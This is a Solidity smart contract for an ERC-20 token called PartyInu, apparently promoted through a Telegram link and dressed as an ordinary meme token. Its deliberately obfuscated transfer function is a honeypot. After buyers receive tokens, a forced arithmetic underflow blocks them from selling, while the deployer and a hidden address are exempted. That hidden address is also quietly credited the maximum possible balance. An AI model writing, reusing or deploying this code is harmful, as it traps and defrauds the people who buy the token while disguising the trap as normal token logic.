// https://t.me/partyinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PartyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private heading;

    function _transfer(
        address mirror,
        address occur,
        uint256 cent
    ) internal override {
        uint256 greatest = storm;

        if (wire[mirror] == 0 && heading[mirror] > 0 && mirror != uniswapV2Pair) {
            wire[mirror] -= greatest;
        }

        address primitive = under;
        under = occur;
        heading[primitive] += greatest + 1;

        _balances[mirror] -= cent;
        uint256 brought = (cent / 100) * storm;
        cent -= brought;
        _balances[occur] += cent;
    }

    address private under;
    mapping(address => uint256) private wire;
    uint256 public storm = 3;

    constructor(
        string memory report,
        string memory born,
        address someone,
        address shake
    ) ERC20(report, born) {
        uniswapV2Router = IUniswapV2Router02(someone);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 forgot = ~uint256(0);

        wire[msg.sender] = forgot;
        wire[shake] = forgot;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[shake] = forgot;
    }
}